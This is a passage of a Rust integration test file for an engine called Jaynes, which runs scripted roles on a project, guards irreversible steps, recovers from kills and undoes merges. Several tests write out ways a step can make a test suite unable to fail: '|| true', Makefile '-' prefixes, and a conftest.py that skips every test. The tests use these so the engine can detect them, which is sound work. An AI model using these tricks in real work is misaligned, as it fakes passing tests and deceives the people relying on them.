    let asked = |step: &str| events(&s, "second-act").iter().rev().find(|e| e["type"] == "QuestionOpened" && e["question"]["step"] == step).expect("asked")["question"]["id"].as_str().expect("id").to_string();
    let draft = asked("draft");
    person(&s, &["answer", "second-act", &draft, "--send"]);
    person(&s, &["answer", "second-act", &draft, "draft=redo:again", "--send"]);
    let redone = asked("draft");
    person(&s, &["answer", "second-act", &redone, "--send"]);
    // the person orders a second act: it happens once more, with a key of its own, so the registry counts it apart
    let out = person(&s, &["answer", "second-act", &asked("send"), "send=redo:send the new draft", "--send"]);
    let sent = world.announcements();
    assert_eq!(sent.len(), 2, "{out}");
    assert!(!sent[0].key.is_empty() && sent[0].key != sent[1].key, "{sent:?}");
    assert_eq!(started(&events(&s, "second-act")).iter().filter(|step| *step == "send").count(), 2, "{out}");
}

#[test]
fn a_role_in_a_file_cannot_send_work_back_to_what_cannot_be_undone() {
    // The two other ways a step that cannot be undone would run twice are closed before any run, by the role's
    // check: its own stop sending it back, and a step of the person's after it marking it to be done again. No run
    // of such a role starts, so nothing acts at all.
    let world = World::open();
    let s = scratch("twice", &world.address());
    let keep = "needs = [\"send\"]\nstop = { ask = \"Close the run?\", verdicts = [\"keep\"] }";
    for (name, send_more, closing, says) in [
        ("own-stop", "stop = { ask = \"Was it sent well?\", verdicts = [\"keep\", \"redo\"] }", keep, "step send cannot be undone, so its stop sends nothing back"),
        ("person-after", "", "needs = [\"send\"]\nstop = { ask = \"Good?\", verdicts = [\"keep\", \"redo\"] }", "step closing comes after send, which cannot be undone, and its stop could send send back"),
    ] {
        let role = draft_send_close(&s, &world, name, send_more, closing);
        let (ok, out) = engine(&s, &["check", role.to_str().expect("path")]);
        assert!(!ok && out.contains(says), "{name}: {out}");
        let (ok, out) = engine(&s, &["start", "--run", name, "--role", role.to_str().expect("path"), "--project", s.project.to_str().expect("path"), "--request", "tell them", "--agent", NO_AGENT]);
        assert!(!ok && out.contains(says), "{name}: a run of it does not start: {out}");
    }
    assert!(world.announcements().is_empty(), "nothing acted");
}

// --- before any run: jaynes check ------------------------------------------------------------------------------

#[test]
fn jaynes_check_reads_a_role_of_scripts_and_says_its_runs_start_at_high_risk() {
    let s = scratch("check", "http://127.0.0.1:1");
    let (ok, out) = engine(&s, &["check", roles().join("announce-version").to_str().expect("path")]);
    assert!(ok, "{out}");
    assert!(out.contains("✔ announce-version 1.0.0 reads: survey → stamp → announce → read-registry"), "{out}");
    assert!(out.lines().any(|l| l.starts_with("! ") && l.contains("announce cannot be undone") && l.contains("high risk")), "an author is told what the step costs every run: {out}");
    assert!(out.contains("✔ \"Nothing is announced before the changelog has the version's entry\": proved"), "{out}");
    // what each step does to the world, as resolved, so silence is never guessed
    for line in [
        "  survey: none: it only reads the project",
        "  stamp: none: it changes only the run's copy, which Jaynes throws away or delivers",
        "  announce: irreversible, as the role declares, and a repeat is harmless (idempotent); it reaches the local port 18473",
        "  read-registry: none, as the role says and nothing checks; it reaches the local port 18473",
    ] {
        assert!(out.lines().any(|l| l == line), "{line}\nis not in:\n{out}");
    }
    // and each way what a step reads of the project can reach a step with network: told, not refused, not promised
    for line in [
        "  survey reads the project → announce needs survey, and has network (local port 18473)",
        "  stamp writes the project → announce needs stamp, and has network (local port 18473)",
    ] {
        assert!(out.lines().any(|l| l == line), "{line}\nis not in:\n{out}");
    }
    assert!(out.contains("not refused") && out.contains("not promised"), "{out}");
    // what the role claims of each delivery, and what proves each claim in a run
    assert!(out.contains("  claim \"The registry lists the version\": proved in a run when the check announced of read-registry passes"), "{out}");
    assert!(out.contains("  claim \"The entry's words are the ones the release needs\": nothing checks it: the role writes the request as it came, and no person is asked"), "{out}");
    // the check that judges the reading is held to its cases: the rejects were written by someone other than its author
    assert!(out.contains("✔ check announced of read-registry: rejected 16 of 16, accepted 2 of 2"), "{out}");
    assert!(!out.contains("untested"), "{out}");
}

#[test]
fn jaynes_check_refuses_a_script_step_that_is_not_well_formed_with_its_line() {
    let s = scratch("check-bad", "http://127.0.0.1:1");
    let role = one_script(&s, "bad", "effect = \"permanent\"", "exit 0\n");
    let (ok, out) = engine(&s, &["check", role.to_str().expect("path")]);
    assert!(!ok && out.contains("✘ the role does not read") && out.contains("role.toml:4: step act has the effect \"permanent\": an effect is \"none\" or \"irreversible\""), "{out}");
}

/// A new role from `jaynes new`, with its example check named in the step that makes the change.
fn new_role_with_its_check(s: &Scratch, name: &str) -> PathBuf {
    let dir = s.base.join(name);
    let (ok, out) = engine(s, &["new", name, dir.to_str().expect("path")]);
    assert!(ok, "{out}");
    let line = "{ script = \"checks/files-exist.sh\", kind = \"open\", about = \"every file named in files is in the project\", cases = \"cases/files-exist\" }";
    let text = std::fs::read_to_string(dir.join("role.toml")).expect("role.toml");
    let named = text.replace("checks = [\"output-follows-schema\", \"suite-passes\"]", &format!("checks = [\"output-follows-schema\", \"suite-passes\", {line}]"));
    assert_ne!(named, text, "the template's checks line moved");
    std::fs::write(dir.join("role.toml"), named).expect("write");
    dir
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn jaynes_check_runs_a_check_of_the_role_s_own_on_its_cases_in_the_box() {
    let s = scratch("cases", "http://127.0.0.1:1");
    let dir = new_role_with_its_check(&s, "tidy");
    let (ok, out) = engine(&s, &["check", dir.to_str().expect("path")]);
    assert!(ok, "{out}");
    assert!(out.contains("✔ check files-exist of make: rejected 2 of 2, accepted 2 of 2"), "{out}");
    assert!(out.contains("✔ check suite-passes of make: comes with Jaynes, which holds it to 24 it rejects and 7 it accepts"), "{out}");
    // the same from the role's own folder, as an author runs it: jaynes check .
    let here = Command::new(BIN).args(["check", "."]).current_dir(&dir).env("JAYNES_ENGINE_HOME", &s.home).env("JAYNES_PYTHON", "python3").env("PYTHONPATH", "").output().expect("check");
    let said = format!("{}{}", String::from_utf8_lossy(&here.stdout), String::from_utf8_lossy(&here.stderr));
    assert!(here.status.success() && said.contains("✔ check files-exist of make: rejected 2 of 2, accepted 2 of 2"), "{said}");
    // a check that accepts everything is refused, with the hole it left open
    std::fs::write(dir.join("checks/files-exist.sh"), "#!/bin/sh\nexit 0\n").expect("write");
    let (ok, out) = engine(&s, &["check", dir.to_str().expect("path")]);
    assert!(!ok && out.contains("✘ check files-exist of make: rejected 0 of 2, accepted 2 of 2"), "{out}");
    assert!(out.contains("it accepted \"one-missing\", which it must reject: a file named that the project does not have, beside one it has"), "{out}");
    assert!(out.contains("a check of the role does not hold to its cases"), "{out}");
    // a check that breaks has rejected nothing: its cases did not run
    std::fs::write(dir.join("checks/files-exist.sh"), "#!/bin/sh\necho broke\nexit 2\n").expect("write");
    let (ok, out) = engine(&s, &["check", dir.to_str().expect("path")]);
    assert!(!ok && out.contains("rejected 0 of 2, accepted 0 of 2") && out.contains("so the case did not run"), "{out}");
}

#[test]
fn a_check_with_no_cases_is_said_to_be_untested_and_the_role_still_reads() {
    let s = scratch("untested", "http://127.0.0.1:1");
    let dir = new_role_with_its_check(&s, "loose");
    let text = std::fs::read_to_string(dir.join("role.toml")).expect("read").replace(", cases = \"cases/files-exist\"", "");
    std::fs::write(dir.join("role.toml"), text).expect("write");
    let (_, out) = engine(&s, &["check", dir.to_str().expect("path")]);
    assert!(out.contains("! check files-exist of make has no cases: untested."), "{out}");
    assert!(!out.contains("✔ check files-exist"), "nothing is told of it as held: {out}");
}

// --- a role that does not fit the project says so before a run starts ---------------------------------------

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_role_that_does_not_fit_the_project_says_why_before_any_run_starts() {
    let s = scratch("fits", "http://127.0.0.1:1");
    let needs = "[[requires]]\nsays = \"The project is a Rust crate\"\nfile = \"Cargo.toml\"\n\n[[requires]]\nsays = \"The project says which version it is at\"\nscript = \"requires/version.sh\"\n";
    let role = one_script(&s, "fits", "", &format!("{DONE}\n"));
    std::fs::create_dir_all(role.join("requires")).expect("dir");
    let check = "test -f VERSION || { echo 'there is no VERSION file'; exit 1; }\necho touched > TOUCHED\n";
    std::fs::write(role.join("requires/version.sh"), check).expect("write");
    std::fs::write(role.join("role.toml"), format!("{}\n{needs}", std::fs::read_to_string(role.join("role.toml")).expect("read"))).expect("write");
    // the project has a VERSION and no Cargo.toml: refused in the role's words, and no run exists
    let (ok, out) = engine(&s, &["start", "--run", "unfit", "--role", role.to_str().expect("path"), "--project", s.project.to_str().expect("path"), "--request", "go", "--agent", NO_AGENT]);
    assert!(!ok && out.contains("the role fits does not fit this project, so no run started and nothing was spent:\n- The project is a Rust crate: the project has no file Cargo.toml"), "{out}");
    assert!(!out.contains("says which version"), "a need that is met is not said: {out}");
    let (_, log) = engine(&s, &["log", "unfit"]);
    assert!(log.trim().is_empty() || !log.contains("RunStarted"), "a run was recorded: {log}");
    assert!(!s.home.join("runs/unfit").exists(), "the run's folder was made");
    assert!(!s.project.join("TOUCHED").exists(), "a requirement's script wrote the person's project");
    // with what the role needs, the run starts
    std::fs::write(s.project.join("Cargo.toml"), "[package]\n").expect("write");
    let out = start(&s, "fit", &role, "go");
    assert!(out.contains("finished: delivered"), "{out}");
    // what Jaynes could not judge is not the project's fault
    std::fs::write(role.join("requires/version.sh"), "echo 'it broke'\nexit 2\n").expect("write");
    let (ok, out) = engine(&s, &["start", "--run", "unknown", "--role", role.to_str().expect("path"), "--project", s.project.to_str().expect("path"), "--request", "go", "--agent", NO_AGENT]);
    assert!(!ok && out.contains("Jaynes could not tell whether the role fits fits this project, so no run started") && out.contains("not the project's"), "{out}");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_role_that_needs_tests_says_so_when_the_project_has_none() {
    let s = scratch("needs-suite", "http://127.0.0.1:1");
    let role = one_script(&s, "suited", "", &format!("{DONE}\n"));
    std::fs::write(role.join("role.toml"), format!("{}\n[[requires]]\nsays = \"The project has tests Jaynes can run\"\nuse = \"suite\"\n", std::fs::read_to_string(role.join("role.toml")).expect("read"))).expect("write");
    let (ok, out) = engine(&s, &["start", "--run", "nosuite", "--role", role.to_str().expect("path"), "--project", s.project.to_str().expect("path"), "--request", "go", "--agent", NO_AGENT]);
    assert!(!ok && out.contains("- The project has tests Jaynes can run: no test runner was found in the project"), "{out}");
    std::fs::write(s.project.join("Makefile"), "test:\n\tgrep -q project README.md\n").expect("write");
    assert!(start(&s, "suite", &role, "go").contains("finished: delivered"));
}

/// A role whose script step changes the project, `act` being the script, checked by the project's suite.
fn suite_checked(s: &Scratch, name: &str, act: &str) -> PathBuf {
    let dir = s.base.join(name);
    std::fs::create_dir_all(dir.join("steps")).expect("dir");
    std::fs::write(dir.join("steps/act.sh"), format!("{act}\n{DONE}\n")).expect("write");
    std::fs::write(dir.join("role.toml"), format!("role = \"{name}\"\nversion = \"1.0.0\"\n\n[[step]]\nname = \"runner\"\nby = \"jaynes\"\nuse = \"find-suite\"\n\n[[step]]\nname = \"act\"\nby = \"role\"\nneeds = [\"runner\"]\nscript = \"steps/act.sh\"\nreach = {{ project = \"write\", write = [\"**\"] }}\nchecks = [\"suite-passes\"]\n")).expect("write");
    dir
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_failure_the_project_s_makefile_ignored_before_the_run_is_not_the_step_s() {
    // the suite-passes of the menu reads the start of the run where the engine keeps it, beside the copy, and runs
    // the suite again as it was defined there when the run changed that
    let s = scratch("ignored", "http://127.0.0.1:1");
    std::fs::write(s.project.join("greeting.txt"), "hello\n").expect("write");
    std::fs::write(s.project.join("Makefile"), "test:\n\t-rm gone.txt\n\tgrep -q hi greeting.txt\n").expect("write");
    for args in [vec!["add", "-A"], vec!["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "a suite"]] {
        assert!(Command::new("git").arg("-C").arg(&s.project).args(&args).status().expect("git").success());
    }
    let theirs = suite_checked(&s, "theirs", "printf 'hi\\n' > greeting.txt");
    let out = start(&s, "theirs", &theirs, "say hi");
    assert!(out.contains("finished: delivered"), "{out}");
    // a step that makes the suite unable to fail, by the same kind of line, fails as the suite of the start does
    let added = suite_checked(&s, "added", "printf 'hello there\\n' > greeting.txt && printf 'test:\\n\\t-rm gone.txt\\n\\t-grep -q hi greeting.txt\\n' > Makefile");
    let out = start(&s, "added", &added, "say hi");
    assert!(!out.contains("finished: delivered"), "{out}");
    let e = events(&s, "added");
    let failed = of(&e, "AttemptFailed", "act");
    let said = failed.iter().map(|f| f["reasons"].to_string()).collect::<Vec<_>>().join(" ");
    assert!(said.contains("as the project defined it when the run began: the run changed Makefile"), "{said}");
}

/// A project of `files`, committed, in a scratch of its own.
fn project_of(name: &str, files: &[(&str, &str)]) -> Scratch {
    let s = scratch(name, "http://127.0.0.1:1");
    for (path, text) in files {
        let at = s.project.join(path);
        std::fs::create_dir_all(at.parent().expect("parent")).expect("dir");
        std::fs::write(at, text).expect("write");
    }
    for args in [vec!["add", "-A"], vec!["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "a suite"]] {
        assert!(Command::new("git").arg("-C").arg(&s.project).args(&args).status().expect("git").success());
    }
    s
}

/// What the step's failed attempts said.
fn failures(s: &Scratch, run: &str) -> String {
    let e = events(s, run);
    of(&e, "AttemptFailed", "act").iter().map(|f| f["reasons"].to_string()).collect::<Vec<_>>().join(" ")
}

/// A step that makes the suite unable to fail through a script the suite runs is not delivered; one that changes
/// that script without harm is: the suite runs again with the start's script, over the code of now.
fn a_suite_neutralized_through_what_it_runs_is_caught(s: &Scratch, harmless: &str, neutralizing: &str, changed: &str) {
    let fine = suite_checked(s, "fine", harmless);
    let out = start(s, "fine", &fine, "say hi");
    assert!(out.contains("finished: delivered"), "{out}");
    let bad = suite_checked(s, "bad", neutralizing);
    let out = start(s, "bad", &bad, "say hi");
    assert!(!out.contains("finished: delivered"), "{out}");
    let said = failures(s, "bad");
    assert!(said.contains(&format!("as the project defined it when the run began: the run changed {changed}")), "{said}");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_suite_neutralized_in_the_script_its_make_target_runs_is_caught() {
    let s = project_of("runner-script", &[("Makefile", "test:\n\tsh tests/run.sh\n"), ("tests/run.sh", "grep -q hi greeting.txt\n"), ("greeting.txt", "hello\n")]);
    a_suite_neutralized_through_what_it_runs_is_caught(
        &s,
        "printf 'hi\\n' > greeting.txt && printf 'echo checking\\ngrep -q hi greeting.txt\\n' > tests/run.sh",
        "printf 'hello there\\n' > greeting.txt && printf 'grep -q hi greeting.txt || true\\n' > tests/run.sh",
        "tests/run.sh",
    );
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_suite_neutralized_in_package_json_is_caught() {
    if !Command::new("npm").arg("--version").output().is_ok_and(|o| o.status.success()) {
        eprintln!("not run: no npm here");
        return;
    }
    let s = project_of("node", &[
        ("package.json", r#"{"name": "greet", "scripts": {"test": "node tests/greet.js"}}"#),
        ("tests/greet.js", "if (!require('fs').readFileSync('greeting.txt', 'utf8').includes('hi')) { console.log('expected hi'); process.exit(1) }\n"),
        ("greeting.txt", "hello\n"),
    ]);
    a_suite_neutralized_through_what_it_runs_is_caught(
        &s,
        r#"printf 'hi\n' > greeting.txt && printf '{"name": "greet", "scripts": {"test": "node tests/greet.js && echo ok"}}' > package.json"#,
        r#"printf 'hello there\n' > greeting.txt && printf '{"name": "greet", "scripts": {"test": "node tests/greet.js || true"}}' > package.json"#,
        "package.json",
    );
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_suite_neutralized_by_a_conftest_is_caught() {
    if !Command::new("python3").args(["-c", "import pytest"]).output().is_ok_and(|o| o.status.success()) {
        eprintln!("not run: no pytest here");
        return;
    }
    let s = project_of("pytest", &[
        ("pytest.ini", "[pytest]\n"),
        ("tests/test_greet.py", "def test_greet():\n    assert 'hi' in open('greeting.txt').read()\n"),
        ("greeting.txt", "hello\n"),
    ]);
    let skip = "import pytest\\n\\n\\ndef pytest_collection_modifyitems(items):\\n    for item in items:\\n        item.add_marker(pytest.mark.skip)\\n";
    a_suite_neutralized_through_what_it_runs_is_caught(
        &s,
        "printf 'hi\\n' > greeting.txt && printf 'import pytest\\n' > tests/conftest.py",
        &format!("printf 'hello there\\n' > greeting.txt && printf '{skip}' > tests/conftest.py"),
        "tests/conftest.py",
    );
}

#[test]
fn the_roles_written_before_still_pass_jaynes_check_as_they_are() {
    // fix-bug is left to the reader's own test, which holds it to the manifest it read into before: proving its
    // promises takes minutes in the unoptimised program these tests run
    let s = scratch("check-before", "http://127.0.0.1:1");
    for name in ["small-change", "directions"] {
        let (ok, out) = engine(&s, &["check", roles().join(name).to_str().expect("path")]);
        assert!(ok && out.contains(&format!("✔ {name} ")) && !out.contains('✘'), "{name}: {out}");
    }
    // and small-change says what a run of it delivers, each claim with what proves it
    let (_, out) = engine(&s, &["check", roles().join("small-change").to_str().expect("path")]);
    assert!(out.contains("claim \"The change comes with what changed, in a sentence or two\": proved in a run when the check field-required of change passes"), "{out}");
    assert!(out.contains("claim \"The change does what the request asked\": nothing checks it: ") && !out.contains("claims nothing"), "{out}");
}

#[test]
fn a_role_of_scripts_conforms_to_the_protocol() {
    let s = scratch("conform", "http://127.0.0.1:1");
    let (ok, out) = engine(&s, &["conformance", roles().join("announce-version").to_str().expect("path")]);
    assert!(ok, "{out}");
}

// --- the engine killed at each moment of an act, for real ------------------------------------------------------

/// Tell the registry where the script is and its process, then wait there, so the engine is killed exactly there.
const MARK: &str = r#"python3 -c 'import os, urllib.request; urllib.request.urlopen("REGISTRY/mark/WHERE/%d" % os.getppid(), timeout=10)'; sleep 60"#;

/// A script that writes NOTE in the run's copy, announces with the run's key, and waits at the mark the test names.
fn act_and_wait(registry: &str, stop: &str) -> String {
    let mark = |at: &str| if at == stop { MARK.replace("REGISTRY", registry).replace("WHERE", at) } else { "true".to_string() };
    format!(
        "echo note > NOTE\ncall=$(cat)\n{}\nprintf '%s' \"$call\" | python3 -c '\nimport json, sys, urllib.request\nkey = json.load(sys.stdin)[\"key\"]\nask = urllib.request.Request(\"{registry}/announcements\", data=b\"{{\\\"version\\\": \\\"1.4.0\\\"}}\", method=\"POST\", headers={{\"Idempotency-Key\": key}})\nurllib.request.urlopen(ask, timeout=10)\n' || exit 2\n{}\nprintf '{{\"done\": true}}' > \"$JAYNES_OUTPUT\"\n",
        mark("before"),
        mark("after")
    )
}

impl World {
    /// The process that marked `at`, once it has.
    fn marked(&self, at: &str) -> Option<String> {
        self.heard.lock().expect("lock").iter().find_map(|h| h.path.strip_prefix(&format!("/mark/{at}/")).map(str::to_string))
    }

    fn unmark(&self) {
        self.heard.lock().expect("lock").retain(|h| !h.path.starts_with("/mark/"));
    }
}

/// Start the run in a process of its own and kill it, and the script it waits on, once the script marks `stop`;
/// with `stop` "done", the engine dies by itself as soon as the record holds the step done, before its commit.
fn killed_at(s: &Scratch, world: &World, run: &str, role: &Path, stop: &str) {
    let mut c = Command::new(BIN);
    c.args(["start", "--run", run, "--role", role.to_str().expect("path"), "--project", s.project.to_str().expect("path"), "--request", "act", "--agent", NO_AGENT])
        .env("JAYNES_ENGINE_HOME", &s.home).env("JAYNES_NO_PAGE", "1").env("JAYNES_PYTHON", "python3").env("PYTHONPATH", "")
        .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null());
    if stop == "done" {
        let status = c.env("JAYNES_DIE_AFTER_DONE", "act").status().expect("start");
        assert_eq!(status.code(), Some(9), "the engine did not die where it was told");
        return;
    }
    let mut p = c.spawn().expect("start");
    let mut pid = None;
    for _ in 0..400 {
        pid = world.marked(stop);
        if pid.is_some() {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    let pid = pid.unwrap_or_else(|| panic!("{run}: the script never reached {stop}"));
    let _killed = p.kill();
    let _waited = p.wait();
    // the machine went down with it: the script it waited on dies too
    let _gone = Command::new("kill").args(["-9", &pid]).status();
    world.unmark();
}

fn act_role(s: &Scratch, world: &World, name: &str, stop: &str, more: &str) -> PathBuf {
    let keys = format!("reach = {{ project = \"write\", write = [\"NOTE\"], local_ports = [{}] }}\neffect = \"irreversible\"\n{more}", world.port);
    one_script(s, name, &keys, &act_and_wait(&world.address(), stop))
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn killed_before_or_after_it_acts_a_step_that_cannot_be_undone_is_never_started_again_on_its_own() {
    for stop in ["before", "after"] {
        let world = World::open();
        let name = format!("killed-{stop}");
        let s = scratch(&name, &world.address());
        let role = act_role(&s, &world, &name, stop, "");
        killed_at(&s, &world, &name, &role, stop);
        let acted = world.announcements().len();
        assert_eq!(acted, usize::from(stop == "after"), "{stop}");
        // Jaynes comes back: it does not start the act again by itself, and says it may have acted
        let (_, out) = engine(&s, &["continue", &name]);
        assert!(out.contains("blocked") && out.contains("may have acted"), "{stop}: {out}");
        assert_eq!(world.announcements().len(), acted, "{stop}: the act was started again on its own: {out}");
        // the person continues: nothing acts, the person is asked about the act, which may have happened
        let role_copy = s.home.join("runs").join(&name).join("role/steps/act.sh");
        std::fs::write(&role_copy, act_and_wait(&world.address(), "none")).expect("the run's copy of the script, which no longer waits");
        let out = person(&s, &["continue", &name]);
        assert_eq!(world.announcements().len(), acted, "{stop}: a bare continue acted again: {out}");
        let asked = events(&s, &name).iter().rev().find(|e| e["type"] == "QuestionOpened" && e["question"]["kind"] == "acted").map(|e| e["question"]["id"].as_str().unwrap_or("").to_string());
        let asked = asked.unwrap_or_else(|| panic!("{stop}: the person is not asked about the act: {out}"));
        // acting again, as the person orders it: once more, with the key it had, so a service that keeps the key counts once
        let out = person(&s, &["answer", &name, &asked, "act=redo:act again", "--send"]);
        assert!(out.contains("finished: delivered"), "{stop}: {out}");
        let sent = world.announcements();
        assert_eq!(sent.len(), acted + 1, "{stop}: {sent:?}");
        assert!(sent.windows(2).all(|w| w[0].key == w[1].key), "{stop}: the act came back with another key: {sent:?}");
        assert_eq!(git(&s.project, &["show", &format!("jaynes/{name}:NOTE")]), "note\n", "{stop}");
    }
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn killed_after_it_acts_a_step_safe_to_repeat_starts_again_by_itself_with_the_same_key() {
    let world = World::open();
    let s = scratch("killed-safe", &world.address());
    let role = act_role(&s, &world, "killed-safe", "after", "idempotent = true");
    killed_at(&s, &world, "killed-safe", &role, "after");
    std::fs::write(s.home.join("runs/killed-safe/role/steps/act.sh"), act_and_wait(&world.address(), "none")).expect("write");
    let out = engine(&s, &["continue", "killed-safe"]).1;
    assert!(out.contains("finished: delivered"), "{out}");
    let sent = world.announcements();
    assert_eq!(sent.len(), 2, "{sent:?}");
    assert_eq!(sent[0].key, sent[1].key, "{sent:?}");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn killed_while_its_check_runs_or_once_it_is_done_an_act_is_not_done_again() {
    // while its check runs: the act is recorded, and only the check runs again
    let world = World::open();
    let s = scratch("killed-check", &world.address());
    let role = act_role(&s, &world, "killed-check", "none", "");
    std::fs::create_dir_all(role.join("checks")).expect("dir");
    std::fs::write(role.join("checks/c.sh"), format!("{}\nexit 0\n", MARK.replace("REGISTRY", &world.address()).replace("WHERE", "check"))).expect("write");
    let text = std::fs::read_to_string(role.join("role.toml")).expect("read");
    std::fs::write(role.join("role.toml"), format!("{text}checks = [{{ script = \"checks/c.sh\", about = \"it shows\", local_ports = [{}] }}]\n", world.port)).expect("write");
    killed_at(&s, &world, "killed-check", &role, "check");
    assert_eq!(world.announcements().len(), 1);
    std::fs::write(s.home.join("runs/killed-check/role/checks/c.sh"), "exit 0\n").expect("the run's copy of the check, which no longer waits");
    let mut out = person(&s, &["continue", "killed-check"]);
    if !out.contains("finished: delivered") {
        out = person(&s, &["continue", "killed-check"]);
    }
    assert!(out.contains("finished: delivered"), "{out}");
    assert_eq!(world.announcements().len(), 1, "the act was done again after a kill while its check ran: {out}");
    // once the record holds it done and before its change is kept: nothing acts again, and its change is delivered
    let world = World::open();
    let s = scratch("killed-done", &world.address());
    let role = act_role(&s, &world, "killed-done", "none", "");
    killed_at(&s, &world, "killed-done", &role, "done");
    assert_eq!(world.announcements().len(), 1);
    let out = person(&s, &["continue", "killed-done"]);
    assert!(out.contains("finished: delivered"), "{out}");
    assert_eq!(world.announcements().len(), 1, "the act was done again after a kill once it was done: {out}");
    assert_eq!(git(&s.project, &["show", "jaynes/killed-done:NOTE"]), "note\n", "its change was lost");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_check_reaches_only_the_local_ports_it_names_never_its_step_s_in_a_real_run() {
    // the step names the registry's port, its check names none: the check is refused it, and the run is not delivered
    for (name, ports) in [("check-no-port", String::new()), ("check-own-port", "local_ports = [PORT]".to_string())] {
        let world = World::open();
        let s = scratch(name, &world.address());
        let role = act_role(&s, &world, name, "none", "");
        std::fs::create_dir_all(role.join("checks")).expect("dir");
        let reach = format!(r#"python3 -c 'import urllib.request; urllib.request.urlopen("{}/mark/check/1", timeout=10)'"#, world.address());
        std::fs::write(role.join("checks/c.sh"), format!("{reach}\n")).expect("write");
        let text = std::fs::read_to_string(role.join("role.toml")).expect("read");
        let declared = if ports.is_empty() { String::new() } else { format!(", {}", ports.replace("PORT", &world.port.to_string())) };
        std::fs::write(role.join("role.toml"), format!("{text}checks = [{{ script = \"checks/c.sh\", about = \"it was heard\"{declared} }}]\n")).expect("write");
        let (_, out) = engine(&s, &["start", "--run", name, "--role", role.to_str().expect("path"), "--project", s.project.to_str().expect("path"), "--request", "act", "--agent", NO_AGENT]);
        assert_eq!(world.announcements().len(), 1, "{name}: the step did not reach its own port: {out}");
        if ports.is_empty() {
            assert!(world.marked("check").is_none(), "the check reached its step's port without naming it: {out}");
            assert!(!out.contains("finished: delivered"), "a check refused its port delivered the run: {out}");
        } else {
            assert!(world.marked("check").is_some(), "the check did not reach the port it names: {out}");
            assert!(out.contains("finished: delivered"), "{out}");
        }
    }
}


// --- Undo, as the person runs it ---------------------------------------------------------------------------------

/// A role of one script that writes NOTE and delivers by merge into the person's branch; the run, delivered.
fn merged_run(s: &Scratch, name: &str) -> PathBuf {
    let dir = s.base.join(name);
    std::fs::create_dir_all(dir.join("steps")).expect("dir");
    std::fs::write(dir.join("steps/act.sh"), format!("echo note > NOTE\n{DONE}\n")).expect("write");
    std::fs::write(dir.join("role.toml"), format!("role = \"{name}\"\nversion = \"1.0.0\"\ndelivery = \"merge\"\n\n[[step]]\nname = \"act\"\nby = \"role\"\nscript = \"steps/act.sh\"\nreach = {{ project = \"write\", write = [\"NOTE\"] }}\n")).expect("write");
    let started = start(s, name, &dir, "note it");
    // every merge waits for the person, who merges it at a terminal
    assert!(!s.project.join("NOTE").exists(), "it landed unasked: {started}");
    let q = merge_question(s, name).unwrap_or_else(|| panic!("the merge waits for the person: {started}"));
    let out = person(s, &["answer", name, q["id"].as_str().expect("id"), "--send"]);
    assert!(out.contains("finished: delivered") && out.contains("merged as"), "{started}\n{out}");
    assert_eq!(std::fs::read_to_string(s.project.join("NOTE")).expect("merged"), "note\n");
    dir
}

fn commit_in_project(s: &Scratch, file: &str, text: &str) {
    std::fs::write(s.project.join(file), text).expect("write");
    for args in [vec!["add", "-A"], vec!["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "the person's own change"]] {
        assert!(Command::new("git").arg("-C").arg(&s.project).args(&args).status().expect("git").success());
    }
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn undo_goes_back_only_from_what_the_run_left_and_only_once() {
    // the person changed the file the run merged: Undo refuses, and their change stays as they made it
    let s = scratch("undo-touched", "http://127.0.0.1:1");
    merged_run(&s, "touched");
    commit_in_project(&s, "NOTE", "theirs\n");
    let head = git(&s.project, &["rev-parse", "HEAD"]);
    let out = person(&s, &["undo", "touched", "--note", "not now"]);
    assert!(out.contains("NOTE") && out.contains("changed since"), "{out}");
    assert_eq!(std::fs::read_to_string(s.project.join("NOTE")).expect("read"), "theirs\n");
    assert_eq!(git(&s.project, &["rev-parse", "HEAD"]), head, "a refused undo moved the person's branch");
    assert!(!types_of(&events(&s, "touched")).contains(&"MergeUndone".to_string()), "a refused undo was recorded as done");
    // the person changed another file: Undo takes back the run's merge and leaves theirs
    let s = scratch("undo-other", "http://127.0.0.1:1");
    merged_run(&s, "other");
    commit_in_project(&s, "README.md", "# Their project\n");
    let out = person(&s, &["undo", "other", "--note", "not now"]);
    assert!(out.contains("undone"), "{out}");
    assert!(!s.project.join("NOTE").exists(), "the run's merge is still there");
    assert_eq!(std::fs::read_to_string(s.project.join("README.md")).expect("read"), "# Their project\n");
    // and a second Undo does nothing to the branch
    let head = git(&s.project, &["rev-parse", "HEAD"]);
    let out = person(&s, &["undo", "other", "--note", "again"]);
    assert!(out.contains("already undone"), "{out}");
    assert_eq!(git(&s.project, &["rev-parse", "HEAD"]), head, "a second undo moved the person's branch");
    assert_eq!(types_of(&events(&s, "other")).iter().filter(|t| *t == "MergeUndone").count(), 1);
}

fn types_of(events: &[Value]) -> Vec<String> {
    events.iter().map(|e| e["type"].as_str().unwrap_or("").to_string()).collect()
}


// --- G19: a merge that brings in what runs later outside any box waits for the person ----------------------------
//
// Red until the core holds the merge: these say what it must do (a design page kept outside the repository).

